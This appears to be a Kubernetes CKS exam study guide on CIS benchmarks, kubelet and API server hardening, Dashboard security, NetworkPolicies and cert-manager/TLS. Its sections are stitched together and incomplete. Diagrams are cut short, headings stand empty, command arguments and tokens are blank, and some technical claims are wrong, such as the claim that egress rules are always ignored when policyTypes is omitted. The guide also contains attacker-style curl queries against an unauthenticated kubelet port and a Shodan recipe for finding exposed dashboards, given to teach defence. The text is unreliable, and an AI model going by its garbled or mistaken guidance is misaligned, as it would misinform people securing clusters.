cosign — Image Signing & Verification

Purpose: Cryptographically signs container images and verifies signatures before deployment. Part of the Sigstore project. When to use: In CI/CD after build (sign), and at admission time via Policy Controller (verify). CKS Exam: ✅ Know it — you must understand the concept and basic usage. Key command: cosign sign --key cosign.key myregistry/anihpj:v1 and cosign verify --key cosign.pub myregistry/anihpj:v1. Used extensively in Chapter 26.

🛡️
AppArmor — Application Sandboxing

Purpose: Linux kernel module that restricts what files, capabilities, and network resources a process (container) can access. When to use: Applied as an annotation on every pod to restrict its filesystem and network access. CKS Exam: ✅ Yes — you must know how to load profiles and apply them via annotations. Key command: apparmor_parser -a /etc/apparmor.d/anihpj-profile. Pod annotation: container.apparmor.security.beta.kubernetes.io/anihpj: localhost/anihpj-profile. Used extensively in Chapter 14.

🔒
Seccomp — Syscall Filtering

Purpose: Filters which Linux system calls a container is allowed to make. A Seccomp profile can reduce the attack surface from 300+ syscalls to just the 50-60 your application actually needs. When to use: Applied via SecurityContext on every pod. CKS Exam: ✅ Yes — you must know how to create and apply custom Seccomp profiles. Vault — External Secret Management

Purpose: HashiCorp Vault stores, rotates, and dynamically generates secrets outside Kubernetes. Pods authenticate to Vault and receive time-limited credentials — secrets never touch etcd. When to use: For production secrets that must never be stored in Kubernetes Secrets at all. CKS Exam: ✅ Know it — you must understand the concept and basic integration pattern. 4.1 What Are CIS Benchmarks?

The Center for Internet Security (CIS) is a non-profit organization that publishes security configuration guidelines — called CIS Benchmarks — for operating systems, cloud providers, and software platforms. The CIS Kubernetes Benchmark is a document containing over 200 specific, testable security configuration checks for every component in a Kubernetes cluster.

📖 What Makes a CIS Check "Testable"?

Every CIS check is written as a binary assertion: it either passes or it fails. There are no subjective "best practices" in the CIS Benchmark — only verifiable configuration states. For example: "Ensure that the --anonymous-auth argument is set to false" (Check 1.2.1). kube-bench reads the actual API server configuration and answers PASS or FAIL. This binary nature is why kube-bench can automate the entire benchmark — and why the CKS exam relies so heavily on it.

Common kube-bench Pitfalls — What Can Go Wrong

😰 Pitfall 1: Running kube-bench from the Wrong Node

kube-bench reads local files. If you run --targets=master on a worker node, it cannot find /etc/kubernetes/manifests/kube-apiserver.yaml and reports everything as [FAIL] or [WARN]. Always run master-targeted checks on a control plane node. Use kubectl get nodes -o wide to identify which nodes have the control-plane role.

✅ Pitfall 2: Ignoring [WARN] Results

A [WARN] means kube-bench could not automatically determine the check result. It does NOT mean the check passed. Always manually investigate [WARN] items — they may be hiding real vulnerabilities. On the exam, if a check returns [WARN], run kube-bench run --check=<number> -v (verbose mode) to see exactly why it could not determine the result, then manually verify by inspecting the configuration file yourself.

😰 Pitfall 3: Fixing a Check But kube-bench Still Shows [FAIL]

This happens when you edit the wrong file or have a typo in the flag name. For API server checks, always verify your edit: grep anonymous-auth /etc/kubernetes/manifests/kube-apiserver.yaml. Wait 30 seconds for the kubelet to restart the static pod, then re-run kube-bench. For kubelet checks, remember that CLI flags in the systemd service file OVERRIDE settings in /var/lib/kubelet/config.yaml. Check both locations: ps aux | grep kubelet | grep anonymous-auth and grep anonymous /var/lib/kubelet/config.yaml.

4.3 Fixing Common CIS Failures — The API Server Manifest

The Kubernetes API server is configured through a static pod manifest located at /etc/kubernetes/manifests/kube-apiserver.yaml. Unlike regular pods, static pods are managed directly by the kubelet — not by the API server or a Deployment controller. This means that editing the YAML file and saving it causes the kubelet to automatically restart the API server with the new configuration. There is no kubectl apply — there is no API server running yet to process it. You edit the file directly on the control plane node using vi or nano.

🔴 Critical: Editing Static Pod Manifests

When you edit /etc/kubernetes/manifests/kube-apiserver.yaml, the kubelet detects the change within seconds and restarts the API server pod. During this restart (typically 10-30 seconds), kubectl commands will fail because the API is temporarily unavailable. Always make multiple flag changes in a SINGLE edit — do not edit, save, wait, edit, save, wait. Batch your changes. Also, make a backup before editing: cp /etc/kubernetes/manifests/kube-apiserver.yaml /root/kube-apiserver.yaml.backup.

What Actually Happens When You Edit a Static Pod Manifest

The kubelet on every control plane node runs a file watcher on /etc/kubernetes/manifests/. This is not a Kubernetes controller — it is a kubelet-internal goroutine that polls the directory every few seconds. Understanding the exact sequence helps you diagnose problems when the API server does not come back:

Static Pod Lifecycle — The Exact Sequence After Saving kube-apiserver.yaml
  T+0s:   You save kube-apiserver.yaml with new flags (:wq)
  T+2s:   kubelet's file watcher detects the modified inode
  T+3s:   kubelet compares the manifest hash with its cached hash
          → Hash differs → triggers a static pod update
  T+4s:   kubelet sends SIGTERM to the old API server container
  T+5s:   Old container stops (graceful period). Port 6443 goes dark.
  T+6s:   kubelet creates a NEW container with the updated command flags
  T+8s:   New API server container starts. Port 6443 begins listening.
  T+10s:  API server loads etcd data, initializes RBAC caches
  T+15s:  API server marks itself ready. kubectl commands work again.
  T+30s:  kube-bench re-run now reflects the new configuration.

  ⚠️  During T+5s to T+10s: ALL kubectl commands fail with
      "The connection to the server was refused". This is NORMAL.

  🔴 RECOVERY: If the API server does NOT come back after 60 seconds:
     1. Check the kubelet knows about the manifest:
        $ ls -la /etc/kubernetes/manifests/kube-apiserver.yaml
     2. Check the kubelet logs for errors:
        $ journalctl -u kubelet -f | grep apiserver
     3. Check the new container's logs:
        $ crictl ps -a | grep apiserver
        $ crictl logs 
     4. Most common cause: TYPO in a flag name. kube-apiserver refuses
        to start with an unrecognized flag. Check your YAML carefully.
     5. If all else fails: RESTORE FROM BACKUP.
        $ cp /root/kube-apiserver.yaml.backup /etc/kubernetes/manifests/
        → kubelet detects the change → restarts with known-good config

Recovering from a Bad Manifest Edit — The Emergency Rollback

This is a scenario you MUST be prepared for on the CKS exam. You edit the API server manifest, save it, and suddenly kubectl stops working. The API server will not start because of an invalid flag. You cannot use kubectl to fix it because kubectl requires the API server. Here is the recovery procedure — memorize it:

🔴 EMERGENCY: API Server Not Starting — Recovery Steps
  • Step 1: Do NOT panic. Your cluster state (pods, deployments, PVs) is in etcd, not in the API server. etcd is still running. Your data is safe.
  • Step 2: SSH to the control plane node directly. You cannot use kubectl. Use SSH or the cloud console.
  • Step 3: Restore the backup. cp /root/kube-apiserver.yaml.backup /etc/kubernetes/manifests/kube-apiserver.yaml. This was created before your edit — right? (Always make a backup!)
  • Step 4: Wait 30 seconds. kubelet detects the restored manifest and starts the API server with the known-good configuration.
  • Step 5: Verify. kubectl get nodes should work again.
  • Step 6: Debug what went wrong. crictl logs <old-container-id> to see the error message from the failed attempt. Fix the typo in your YAML, make a new backup, and try again.

⚠️ CKS EXAM: Always make a backup before editing ANY manifest file. The exam scores you on whether the cluster works at the end, not just on whether you added the right flags. A cluster with a dead API server = FAIL.

4.4 kubelet Hardening — CIS Node Checks

The kubelet runs on every node in the cluster. It is the agent responsible for starting and stopping pods, reporting node status, and managing container lifecycles. A compromised kubelet gives an attacker control over every pod on that node — including the ability to exec into containers, read pod logs, and access mounted Secrets. The kubelet is configured through /var/lib/kubelet/config.yaml (and sometimes through command-line flags in the systemd service file at /etc/systemd/system/kubelet.service.d/10-kubeadm.conf).

kubelet Hardening — Before vs After

❌ Insecure kubelet (Default)
  • authentication.anonymous.enabled: true — Anyone can query the kubelet API without credentials
  • authentication.webhook.enabled: false — No API server validation of kubelet requests
  • authorization.mode: AlwaysAllow — Every authenticated request is permitted with no RBAC check
  • readOnlyPort: 10255 — Unauthenticated read-only port exposes pod list, container logs, and metrics to anyone

ATTACKER: curl http://node:10255/pods → Lists all pods. curl http://node:10255/stats/summary → All metrics. No credentials needed.

✅ Hardened kubelet (CKS)
  • authentication.anonymous.enabled: false — All requests must be authenticated
  • authentication.webhook.enabled: true — Every request is validated by the API server
  • authorization.mode: Webhook — SubjectAccessReview checks every request against RBAC
  • readOnlyPort: 0 — Unauthenticated port is completely disabled

ATTACKER: curl http://node:10255/pods → Connection REFUSED. Anonymous access → 401 Unauthorized.

Applying kubelet Changes

Unlike the API server (which auto-restarts via kubelet watching the manifest), the kubelet itself requires a manual restart after configuration changes. The kubelet is managed by systemd, not by a static pod manifest:

The kubelet restart procedure

  $ vi /var/lib/kubelet/config.yaml

  # Step 2: Restart kubelet (systemd-managed)
  $ systemctl daemon-reload
  $ systemctl restart kubelet

  # Step 3: Verify kubelet is running
  $ systemctl status kubelet
  ● kubelet.service - kubelet: The Kubernetes Node Agent
     Active: active (running)

  # Step 4: Verify the node is Ready
  $ kubectl get nodes
  NAME      STATUS   ROLES           AGE   VERSION
  node-1    Ready    control-plane   30d   v1.30.0

  $ kube-bench run --targets=node --check=4.2.1
  [PASS] 4.2.1 Ensure --anonymous-auth=false ✅
⚠️ Restart Carefully — Node Goes NotReady Briefly

When you restart the kubelet, the node briefly goes to NotReady status (typically 5-15 seconds). Pods on the node continue running during this period — the kubelet restart does not kill running containers. However, the scheduler will not place new pods on the node until it returns to Ready. On the CKS exam, always drain the node first if the question asks you to (kubectl drain node-1 --ignore-daemonsets), then restart kubelet, then uncordon (kubectl uncordon node-1). If the exam does not specify draining, a simple restart is fine.

How kubelet Webhook Authentication Actually Works

When you set authentication.webhook.enabled: true and authorization.mode: Webhook, every request to the kubelet API (on port 10250) is validated by the API server — not by the kubelet itself. This is the most important security architecture detail for the CKS exam. Here is the exact flow:

kubelet Webhook Auth Flow — Step by Step
  STEP 1: A request arrives at kubelet port 10250
  ─────────────────────────────────────────────────
  Example: kubectl logs anihpj-pod → API server → kubelet:10250/logs

  STEP 2: kubelet checks: is the request authenticated?
  ────────────────────────────────────────────────────────
  With webhook enabled, kubelet does NOT trust its own certs.
  It extracts the bearer token from the request and sends it
  to the API server for validation:

  POST https://kube-apiserver:6443/apis/authentication.k8s.io/v1/tokenreview
  {
    "apiVersion": "authentication.k8s.io/v1",
    "kind": "TokenReview",
    "spec": {
      "token": ""
    }
  }

  STEP 3: API server responds with the authenticated identity
  ─────────────────────────────────────────────────────────────
  {
    "status": {
      "authenticated": true,
      "user": {
        "username": "system:serviceaccount:kube-system:kubelet-api",
        "groups": ["system:serviceaccounts", "system:authenticated"]
      }
    }
  }

  STEP 4: kubelet checks authorization (with authorization.mode: Webhook)
  ────────────────────────────────────────────────────────────────────────
  POST https://kube-apiserver:6443/apis/authorization.k8s.io/v1/subjectaccessreview
  {
    "spec": {
      "user": "system:serviceaccount:kube-system:kubelet-api",
      "resourceAttributes": {
        "verb": "get",
        "resource": "pods",
        "subresource": "log",
        "name": "anihpj-pod",
        "namespace": "anihpj"
      }
    }
  }

  STEP 5: API server checks RBAC
  ──────────────────────────────
  Does SA "kube-system:kubelet-api" have a RoleBinding that allows
  "get" on "pods/log" in namespace "anihpj"?

  If YES → HTTP 200. kubelet returns the logs.
  If NO  → HTTP 403. kubelet rejects the request.

  🔑 KEY INSIGHT: With webhook mode, the kubelet has ZERO authority
     to decide who can access its API. Every decision is made by the
     API server via RBAC. This means a compromised kubelet cannot
     grant access to unauthorized users — it MUST ask the API server.

kubelet Certificate Rotation — Automated PKI Management

kubelet certificates expire after 1 year by default. Without rotation, your nodes eventually lose the ability to communicate with the API server — and your cluster breaks silently. The CKS exam expects you to know how to enable automatic certificate rotation so this never happens:

kubelet Certificate Rotation Flow
  CONFIGURATION (in /var/lib/kubelet/config.yaml):
  ─────────────────────────────────────────────────
  rotateCertificates: true          # kubelet requests new certs
  serverTLSBootstrap: true          # kubelet uses CSR API for server cert

  THE AUTOMATIC ROTATION FLOW:
  ────────────────────────────
  1. kubelet monitors its certificate expiry date
  2. At 80% of cert lifetime (approx. 9.6 months), kubelet generates
     a new key pair and creates a CertificateSigningRequest (CSR)
  3. A controller (kube-controller-manager with
     --cluster-signing-cert-file and --cluster-signing-key-file)
     automatically approves the CSR and signs the new certificate
  4. kubelet picks up the new cert and replaces the old one
  5. The node continues operating with NO interruption

  VERIFYING ROTATION:
  ───────────────────
  # Check if rotation is enabled
  $ grep rotateCertificates /var/lib/kubelet/config.yaml

  # Check current cert expiry
  $ openssl x509 -in /var/lib/kubelet/pki/kubelet-client-current.pem \
      -noout -dates
  notBefore=Jan  1 00:00:00 2024 GMT
  notAfter=Dec 31 23:59:59 2024 GMT

  # List CSRs (pending rotation requests)
  $ kubectl get csr
  NAME        AGE   SIGNERNAME                     REQUESTOR          CONDITION
  csr-abc123  5m    kubernetes.io/kube-apiserver-* system:node:node-1 Approved

  ⚠️  WITHOUT rotation: On day 366, the kubelet cert expires.
      kubelet disconnects from API server. Node becomes NotReady.
      Pods keep running but cannot be managed. Emergency cert renewal
      required — manually. Avoid this by enabling rotation NOW.

Real-World Troubleshooting: When Your CIS Fix Does Not Work

On the exam — and in production — fixes do not always work on the first attempt. Here are the three most common failure patterns, their root causes, and the exact diagnostic commands you need:

🔴 Scenario 1: Edited kube-apiserver.yaml but kube-bench still shows [FAIL]

Root Cause: The API server has not restarted yet, or you edited the wrong manifest file. Kubeadm-based clusters store the manifest at /etc/kubernetes/manifests/kube-apiserver.yaml. But if the cluster was installed with a different tool (kops, k3s, RKE), the path might differ.

Diagnostic Commands:

  # 1. Verify the manifest file path is correct
  $ ps aux | grep kube-apiserver | grep -o 'manifest.*yaml'
  → Should show the actual manifest path being used

  # 2. Check if kubelet detected your change
  $ journalctl -u kubelet --since "2 minutes ago" | grep apiserver
  → Look for "static pod" and "kube-apiserver" messages

  # 3. Force the kubelet to re-sync
  $ systemctl restart kubelet
  → This forces the kubelet to re-read ALL manifests in /etc/kubernetes/manifests/

  # 4. Verify the API server pod is running with your flags
  $ crictl inspect $(crictl ps --name kube-apiserver -q) | grep args
🟡 Scenario 2: Edited kubelet config.yaml but changes are ignored

Root Cause: Command-line flags passed to the kubelet via the systemd service file OVERRIDE settings in /var/lib/kubelet/config.yaml. If a flag like --anonymous-auth=false appears in both the config file AND the systemd drop-in, the CLI value wins. This is a common exam trap.

Diagnostic Commands:

  # 1. Check the ACTUAL kubelet process flags (these override config.yaml)
  $ ps aux | grep kubelet | tr ' ' '\n' | grep anonymous
  → If --anonymous-auth=true appears here, config.yaml is IGNORED

  # 2. Find the systemd drop-in that sets the flag
  $ grep -r "anonymous-auth" /etc/systemd/system/kubelet.service.d/
  → Shows which file has the conflicting flag

  # 3. Fix: remove or change the flag in the systemd file, then restart
  $ systemctl daemon-reload && systemctl restart kubelet
🔴 Scenario 3: kube-bench says [WARN] when you expected [PASS]

Root Cause: kube-bench could not programmatically determine the check result. This often happens when a flag is present but its value is ambiguous, or when a configuration spans multiple files and kube-bench only checks one.

Diagnostic Commands:

  # 1. Run kube-bench in verbose mode for the specific check
  $ kube-bench run --check=1.2.6 -v
  → This shows EXACTLY what kube-bench tested and why it returned [WARN]

  # 2. Manually verify the check
  $ grep authorization-mode /etc/kubernetes/manifests/kube-apiserver.yaml
  → Confirm the flag value matches the CIS recommendation exactly

  # 3. If manually verified correct and kube-bench still says [WARN]:
  → This is a known limitation. Document it. On the exam, [WARN] with
    manual verification may be acceptable if the configuration is correct.

5.1 Why the Dashboard Is Dangerous

The Kubernetes Dashboard is not inherently insecure — but its default deployment model is. When you install the Dashboard from the official manifest without modifications, it creates a ServiceAccount with cluster-admin privileges and exposes a web interface. If that web interface is reachable from the internet — through a LoadBalancer Service, a NodePort, or an Ingress without authentication — anyone with a browser can manage your entire cluster. This is not a hypothetical scenario. It is exactly how Tesla was breached in 2018: attackers found an exposed Dashboard, used its admin privileges to deploy crypto-mining containers, and extracted AWS credentials from the cluster environment.

🔴 The Tesla Breach — A Dashboard Story

Tesla's Kubernetes Dashboard was accessible from the public internet with no authentication required. The Dashboard's default ServiceAccount had cluster-admin. Attackers used Shodan (a search engine for internet-connected devices) to find the Dashboard, logged in without credentials, deployed crypto-mining pods, and extracted AWS IAM credentials stored in Kubernetes Secrets — all through the Dashboard's point-and-click interface. No exploit was needed. No vulnerability was exploited. The attack succeeded because the Dashboard was exposed and over-privileged — two defaults that the CKS curriculum teaches you to fix.

How Attackers Find Exposed Dashboards — The Shodan Connection

Shodan is a search engine that indexes internet-connected devices — not web pages. It constantly scans the entire IPv4 address space, fingerprinting services on every port. When it finds a service responding on port 443 or 8443 with Kubernetes-specific HTTP headers (Audit-Id, Kubernetes response headers), it tags it as a Kubernetes API or Dashboard. An attacker simply searches Shodan for product:"Kubernetes" and gets a list of IP addresses with exposed Dashboards — complete with screenshots of the login page. If the Dashboard's "Skip" button is enabled (which it is by default in older versions), the attacker clicks it and gains cluster-admin access. No exploit. No vulnerability. Just a search engine query and a browser. This is not a theoretical attack path — this is exactly what happened to Tesla, and it is what continues to happen to hundreds of unsecured clusters discovered every month.

The "Skip" Button — Tesla's Fatal Misconfiguration

Kubernetes Dashboard versions prior to 2.0.0 included a "Skip" button on the login page. This button was not a bug — it was a deliberate feature for development environments. Since the default Dashboard ServiceAccount had cluster-admin, clicking "Skip" gave full cluster control to anyone who could reach the login page. Tesla's Dashboard had this button enabled AND was exposed on the public internet. The attacker did not need a password, a token, or an exploit. They clicked a button. In Dashboard 2.0.0+, the "Skip" button is disabled by default, but it can still be re-enabled with the --enable-skip-login flag. Never use this flag in any environment — including development.

Creating a Restricted ServiceAccount for Dashboard

The Dashboard's default ServiceAccount has cluster-admin. The first hardening step is creating a dedicated, restricted ServiceAccount with read-only access scoped to specific namespaces:

Restricted Dashboard ServiceAccount — read-only, namespace-scoped
  apiVersion: v1
  kind: ServiceAccount
  metadata:
    name: dashboard-reader
    namespace: kubernetes-dashboard
  ---
  apiVersion: rbac.authorization.k8s.io/v1
  kind: ClusterRole
  metadata:
    name: dashboard-readonly
  rules:
  - apiGroups: [""]
    resources: ["pods", "services", "configmaps", "persistentvolumeclaims"]
    verbs: ["get", "list", "watch"]        # READ ONLY
  # NOTE: Secrets deliberately NOT included.
  ---
  apiVersion: rbac.authorization.k8s.io/v1
  kind: ClusterRoleBinding
  metadata:
    name: dashboard-reader-binding
  subjects:
  - kind: ServiceAccount
    name: dashboard-reader
    namespace: kubernetes-dashboard
  roleRef:
    kind: ClusterRole
    name: dashboard-readonly
    apiGroup: rbac.authorization.k8s.io
  ---

💡 OIDC — The Enterprise Authentication Pattern

For production clusters, token-based auth is insufficient — tokens are static, long-lived, and easy to leak. The enterprise pattern is OIDC integration: configure the API server with --oidc-issuer-url and --oidc-client-id pointing to your identity provider (Google Workspace, Azure AD, Okta). The Dashboard then redirects users to the IdP for login, which can enforce MFA, device trust, and session timeouts. OIDC is covered in detail in Chapter 8.

How the Dashboard Token Login Actually Works

Understanding the internal flow helps you diagnose authentication issues on the exam. When you paste a token into the Dashboard login page, here is exactly what happens behind the scenes:

Dashboard Token Authentication — Internal Flow
  1. You paste a bearer token into the Dashboard login page and click "Sign In"

  2. The Dashboard stores the token in the browser's localStorage:
     localStorage.setItem('kubernetes-dashboard-token', '')
     ⚠️  This means ANY JavaScript running in the browser context
         (including malicious browser extensions) can read this token.

  3. Every Dashboard API request includes the token as an HTTP header:
     Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9...

  4. The API server receives the request → extracts the token → validates:
     a. Is the JWT signature valid? (signed by the SA token controller)
     b. Is the token expired? (if using bound tokens with expiration)
     c. Is the ServiceAccount still active?

  5. If valid → the API server identifies the user as:
     system:serviceaccount::
     And checks RBAC: does this SA have the requested permission?

  6. The Dashboard UI renders based on what the API returns.
     Resources the SA cannot see → simply do not appear in the UI.
     (This is why read-only SAs see pods but not Secrets — RBAC hides them.)

  🔑 KEY INSIGHT: The Dashboard has NO authentication logic of its own.
     It is a transparent proxy. All auth decisions are made by the API server.
     This means securing the Dashboard = securing the API server's RBAC.

✅ Dashboard Security Verification Checklist

By default, every pod in a Kubernetes cluster can reach every other pod on every port. There are no firewalls between pods. There are no network segments between namespaces. 6.1 The Default: All Pods Can Talk to All Pods

Kubernetes was designed with a flat network model: every pod gets a unique, cluster-routable IP address, and every pod can reach every other pod without NAT. This was a deliberate design choice to simplify pod-to-pod communication — no port mapping, no manual routing, no network segmentation. But it comes with a devastating security implication: there are zero network barriers between pods. One compromised pod means lateral movement to every other pod in the cluster.

🔴 The Flat Network Is the Default — Not a Bug

Kubernetes does not ship with any NetworkPolicies. There is no default-deny rule. There is no namespace isolation. Every pod, in every namespace, can initiate a TCP connection to every other pod, on every port. This is not a misconfiguration — it is the intended default. The CKS exam tests whether you know to override this default with explicit NetworkPolicies.

Why Kubernetes Chose a Flat Network — The Design Philosophy

The flat network is not an oversight — it is a deliberate architectural choice rooted in Kubernetes' origin at Google. The design principle is: every pod should be able to reach every other pod without NAT, without port mapping, and without manual route configuration. This simplifies development — a pod in namespace A can call a service in namespace B using its cluster DNS name, and it just works. The trade-off — security — was deferred to NetworkPolicies. The CKS exam tests whether you understand that this trade-off exists and that it is YOUR responsibility to apply the security layer that Kubernetes intentionally left open.

6.2 NetworkPolicy Fundamentals

A NetworkPolicy is a namespaced Kubernetes resource that defines which network traffic is allowed to and from pods. It uses label selectors to identify target pods and rules to specify allowed traffic sources, destinations, and ports. Crucially, NetworkPolicies are additive — if multiple policies select the same pod, the effective rule set is the union of all allows. And once a pod is selected by ANY NetworkPolicy, all traffic is denied except what is explicitly allowed.

📖 CNI Dependency — Your CNI Plugin MUST Support NetworkPolicy

NetworkPolicy resources are enforced by the CNI plugin, not by the API server. If your CNI does not support NetworkPolicy (Flannel, Kindnet), your policies will be silently ignored — you can apply them, kubectl will show them, but they will have ZERO effect on actual traffic. Always verify your CNI: Calico and Cilium fully support NetworkPolicy. Weave Net supports it. Flannel does not. On the CKS exam, the cluster has a compatible CNI pre-configured — you do not need to install one.

NetworkPolicy Decision Flowchart — How K8s Decides to Allow or Block

The logic every CNI plugin follows for NetworkPolicy enforcement
  PACKET arrives at pod's network interface

      Pod with NO policies = wide open. Pod with ONE policy = locked down.

How CNI Plugins Enforce NetworkPolicies — iptables vs eBPF

iptables-based (Calico, Weave)

Every NetworkPolicy rule is translated into iptables rules. Each allow rule becomes an ACCEPT entry; implicit deny becomes a DROP. Battle-tested but scales poorly — thousands of pods mean thousands of iptables rules, slowing packet processing.

Debug: iptables -L -n -v | grep cali shows actual Calico rules.

eBPF-based (Cilium)

Uses eBPF programs attached before iptables. Each policy becomes an O(1) eBPF map lookup, scaling to tens of thousands of pods with no degradation. Also supports FQDN-based egress (e.g., "allow egress to *.github.com").

Debug: cilium policy get and cilium monitor for real-time decisions.

The Additive Rule Behavior — Policies Cannot "Undo" Each Other

NetworkPolicies are purely additive — they can only ALLOW, never DENY. If Policy A allows monitoring pods to reach postgres, and Policy B allows anihpj pods to reach postgres, the effective rule is the UNION: both can reach postgres. You cannot create Policy C to "block monitoring from postgres" — NetworkPolicies have no DENY rules. To remove access, you must DELETE the policy that granted it.

The policyTypes Trap — CKS Exam Pitfall

😰 When policyTypes is omitted, it defaults to [Ingress] — your egress rules are silently IGNORED.

You create a policy with egress rules but forget policyTypes. The policy only affects ingress. Your egress rules do nothing — and you get no error message. Always explicitly set policyTypes: [Ingress, Egress] when you need both directions.

💡 The 3-Second Timeout Rule

When testing NetworkPolicies, use --timeout=3 on wget or -w 3 on nc. Blocked connections do not get a "Connection Refused" — they hang until the TCP SYN timeout (typically 30-75 seconds). Debugging When NetworkPolicies Do Not Work — Common Failure Modes

🔴 Failure 1: Policy applied but ALL traffic still flows

Root Cause: CNI does not support NetworkPolicy (Flannel), OR podSelector does not match any pods. If no pods are selected, the policy has zero effect. Diagnose: kubectl get pods -n <ns> --show-labels → verify labels match podSelector exactly (case-sensitive).

🟡 Failure 2: Egress rules ignored

🔴 Failure 3: DNS works but HTTP fails

Root Cause: You allowed UDP 53 (DNS) but your app needs TCP 53 for large DNS responses, OR your allow rule has the wrong port/protocol. Diagnose: kubectl exec <pod> -- nc -zv <svc> <port> — verify TCP connectivity.

In Kubernetes, TLS termination typically happens at the Ingress controller: the Ingress controller holds the TLS certificate, decrypts incoming HTTPS traffic, and forwards the plain HTTP request to the backend pod inside the cluster. This is called TLS termination at the edge — the most common pattern for Kubernetes deployments.

Understanding these fields helps you debug TLS errors on the exam:

Every HTTPS connection begins with a TLS handshake — a multi-step negotiation between the browser and the Ingress controller. Understanding this sequence helps you diagnose TLS errors when users report "connection not secure":

  ─────────────────                         ────────────────────────────
  1. ClientHello ─────────────────────▶

     • Supported cipher suites
     • SNI: "anihpj.com" (which site?)

Why HTTP Inside the Cluster Is Acceptable — The Trust Boundary

After TLS termination at the Ingress controller, traffic to the backend pod is plain HTTP. This concerns many newcomers: "Isn't that insecure?" The answer is: it depends on your trust model. The Ingress controller and your application pods are inside the same cluster network, protected by NetworkPolicies (Chapter 6). An attacker who can sniff internal pod-to-pod traffic has already compromised a pod on that node — at which point they can read data from memory directly, making TLS between pods redundant for confidentiality (though not for authentication — that is where mTLS comes in, covered in Chapter 22). For the CKS exam, the standard pattern is TLS termination at the Ingress controller with HTTP to the backend. End-to-end TLS (mTLS) is an advanced topic tested separately.

7.2 cert-manager — Automated Certificate Management

Manually creating TLS certificates works, but it does not scale. Certificates expire. You forget to renew them. Your site goes down. cert-manager solves this by automating the entire certificate lifecycle: it watches Ingress resources, requests certificates from Let's Encrypt (or a private CA), stores them as Kubernetes Secrets, and automatically renews them 30 days before expiry. Once configured, you never think about certificate renewal again.

⚠️ Let's Encrypt Rate Limits — Use Staging First

Let's Encrypt production has strict rate limits: 50 certificates per domain per week. If you are testing your cert-manager configuration, use the staging endpoint: https://acme-staging-v02.api.letsencrypt.org/directory. Staging certificates are not trusted by browsers, but they let you verify that your DNS, Ingress, and cert-manager configuration are correct before you switch to production. On the CKS exam, you will use a provided CA endpoint — not the public Let's Encrypt.

HTTP-01 vs DNS-01 Challenges — How Let's Encrypt Verifies Domain Ownership

Before Let's Encrypt issues a certificate, it must verify that you control the domain. It does this through challenges — cryptographic proofs of domain ownership. cert-manager supports two challenge types, and choosing the right one depends on your infrastructure:

HTTP-01 Challenge

Let's Encrypt makes an HTTP request to http://anihpj.com/.well-known/acme-challenge/<token>. cert-manager creates a temporary pod or configures the Ingress to serve the challenge response. This is the simplest method — it requires only that port 80 is reachable from the internet. Limitation: Cannot issue wildcard certificates. Does not work if your cluster is behind a firewall that blocks inbound HTTP.

DNS-01 Challenge

cert-manager creates a TXT record in your DNS zone (_acme-challenge.anihpj.com). Let's Encrypt queries DNS to verify the record exists. This method works even if port 80 is blocked — it only requires DNS API access. Advantage: Supports wildcard certificates (*.anihpj.com). Limitation: Requires cert-manager to have API credentials for your DNS provider (Route53, Cloudflare, Google Cloud DNS).

Debugging cert-manager — When Certificates Do Not Issue

The most common cert-manager failure on the CKS exam is a Certificate resource stuck in a "Pending" or "Failed" state. Here is how to diagnose and fix it:

🔴 Certificate Stuck — Diagnostic Commands
  # 1. Check the Certificate resource status
  $ kubectl describe certificate anihpj-tls -n anihpj-prod
  → Look for "Ready: False" and the "Reason" field.
    Common reasons: "NotFound" (Secret doesn't exist yet — normal),
    "Pending" (waiting for challenge), "Failed" (challenge failed).

  # 2. Check the CertificateRequest
  $ kubectl get certificaterequest -n anihpj-prod
  $ kubectl describe certificaterequest <name>
  → Shows the exact challenge status and any error messages.

  # 3. Check the Order (ACME order resource)
  $ kubectl get orders -n anihpj-prod
  $ kubectl describe order <name>
  → Shows the ACME authorization URL and challenge status.

  # 4. Check the Challenge resource directly
  $ kubectl get challenges -n anihpj-prod
  $ kubectl describe challenge <name>
  → "Reason: Waiting for HTTP-01 challenge propagation"
  → "Reason: DNS record not found" means DNS-01 failed.

  # 5. Check cert-manager logs
  $ kubectl logs -n cert-manager deploy/cert-manager
  → Look for ERROR lines about your domain.

The ACME Protocol Flow — What cert-manager Actually Does

cert-manager implements the ACME (Automated Certificate Management Environment) protocol — the same protocol used by Let's Encrypt. Understanding the ACME flow demystifies the cert-manager logs and helps you troubleshoot on the exam:

ACME Protocol Flow — cert-manager to Let's Encrypt
  cert-manager                              Let's Encrypt (ACME Server)
  ────────────                              ───────────────────────────
  1. Create ACME account
     POST /acme/new-acct ────────────────▶  Account created. Returns account URL.

  2. Submit certificate order
     POST /acme/new-order ───────────────▶  Order created. Returns:
       {                                      • Order URL
         "identifiers": [                     • Authorization URLs (one per domain)
           {"type":"dns","value":"anihpj.com"}, • Finalize URL
           {"type":"dns","value":"www.anihpj.com"}
         ]
       }

  3. Fetch authorizations
     POST /acme/authz/<id> ───────────────▶  Returns challenge details:
                                                • HTTP-01: token + expected response
                                                • DNS-01: TXT record value

  4. Complete challenges
     (HTTP-01: serve token at .well-known/)  Let's Encrypt verifies:
     (DNS-01: create TXT record)              • HTTP: GET http://anihpj.com/.well-known/...
                                              • DNS: dig TXT _acme-challenge.anihpj.com

  5. Finalize order
     POST /acme/finalize ─────────────────▶  Submit CSR (Certificate Signing Request)
       { "csr": "<base64-encoded CSR>" }

  6. Download certificate
     GET /acme/cert/<id> ─────────────────▶  Returns signed certificate chain

How HSTS Works — Why It Is Critical

HTTP Strict Transport Security (HSTS) solves a fundamental problem with HTTPS: the first request a user makes to your site may still be over HTTP. An attacker on the same network (coffee shop WiFi, airport, compromised router) can intercept that first HTTP request and redirect the user to a fake site — this is called an SSL stripping attack. HSTS tells the browser: "For the next year (31,536,000 seconds), always use HTTPS for this domain — do not even attempt HTTP." After the first successful HTTPS visit, the browser enforces this automatically. The includeSubDomains directive extends this protection to all subdomains (www.anihpj.com, api.anihpj.com, admin.anihpj.com).

⚠️ HSTS Preloading — The Point of No Return

You can submit your domain to the HSTS Preload List (hstspreload.org), which is hardcoded into Chrome, Firefox, and Safari. Once on this list, browsers will NEVER attempt HTTP for your domain — even on the very first visit. This is the strongest protection, but it is irreversible in practice. If you ever need to serve HTTP on any subdomain, you cannot be on the preload list. Do not submit unless you are 100% certain you will always serve HTTPS everywhere.

Testing Your TLS Configuration — curl and SSL Labs

After configuring TLS, always verify it works correctly before declaring the task complete. Here are the essential verification commands — use them on every TLS task:

TLS Verification Commands
  # 1. Verify HTTPS is serving (no certificate error)
